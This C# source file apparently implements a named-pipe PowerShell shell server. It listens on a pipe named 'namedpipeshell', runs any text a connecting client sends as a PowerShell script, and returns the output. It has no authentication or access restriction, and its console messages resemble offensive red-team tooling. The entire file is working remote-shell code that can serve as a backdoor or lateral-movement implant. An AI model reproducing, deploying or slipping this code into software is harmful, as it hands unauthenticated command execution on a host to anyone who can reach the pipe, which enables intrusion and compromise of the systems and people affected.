using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;
using System.IO.Pipes;
using System.Text;

namespace Server
{
    class Server
    {
        static void Main(string[] args)
        {

            Runspace runspace = null;
             // Create a PS runspace.
            try
            {
                runspace = RunspaceFactory.CreateRunspace();
                runspace.ApartmentState = System.Threading.ApartmentState.STA; 
                runspace.Open();
            } catch
            {
                Console.WriteLine("[!] Error: Could not create a PS runspace.");
                Environment.Exit(1);
            }


           while(true)
            {
                using (var pipe = new NamedPipeServerStream(
                "namedpipeshell",
                PipeDirection.InOut,
                NamedPipeServerStream.MaxAllowedServerInstances,
                PipeTransmissionMode.Message))
                {
                    Console.WriteLine("[*] Waiting for client connection...");
                    pipe.WaitForConnection();
                    Console.WriteLine("[*] Client connected.");
                    while (true)
                    {
                        var messageBytes = ReadMessage(pipe);
                        var line = Encoding.UTF8.GetString(messageBytes);
                        Console.WriteLine("[*] Received: {0}", line);
                        if (line.ToLower() == "exit")
                        {
                            return;
                        }

                        // Execute PowerShell code.
                        try
                        {

                            Pipeline PsPipe = runspace.CreatePipeline();
                            PsPipe.Commands.AddScript(line);
                            PsPipe.Commands.Add("Out-String");
                            Collection<PSObject> results = PsPipe.Invoke();
                            StringBuilder stringBuilder = new StringBuilder();
                            foreach (PSObject obj in results)
                            {
                                stringBuilder.AppendLine(obj.ToString());
                            }

                            var response = Encoding.ASCII.GetBytes(stringBuilder.ToString());

                            try
                            {
                                pipe.Write(response, 0, response.Length);
                            }
                            catch
                            {
                                Console.WriteLine("[!] Pipe is broken!");
                                break;
                            }

                        }
                        catch (Exception e)
                        {
                            var response = Encoding.ASCII.GetBytes("ERROR: " + e.Message);
                            pipe.Write(response, 0, response.Length);
                        }
                    }
                }
            }
        }

        private static byte[] ReadMessage(PipeStream pipe)
        {
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                do
                {
                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                }
                while (!pipe.IsMessageComplete);

                return ms.ToArray();
            }
        }
    }
}
